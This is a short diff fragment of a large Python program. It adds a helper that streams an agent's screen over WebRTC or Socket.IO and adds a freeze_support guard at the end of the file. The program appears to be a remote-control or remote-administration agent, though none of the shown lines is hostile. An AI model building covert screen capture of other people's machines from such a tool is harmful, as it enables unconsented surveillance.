+# [ OK ] NOW DEFINE stream_screen_webrtc_or_socketio AFTER stream_screen_h264_socketio
 def stream_screen_webrtc_or_socketio(agent_id):
     """Smart screen streaming that automatically chooses WebRTC or Socket.IO based on availability."""
     if AIORTC_AVAILABLE and WEBRTC_ENABLED:
@@ -17120,3 +18575,9 @@ Windows Registry Editor Version 5.00
         return False
 
 # End of file
+if __name__ == "__main__":
+    try:
+        import multiprocessing
+        multiprocessing.freeze_support()
+    except Exception:
+        pass
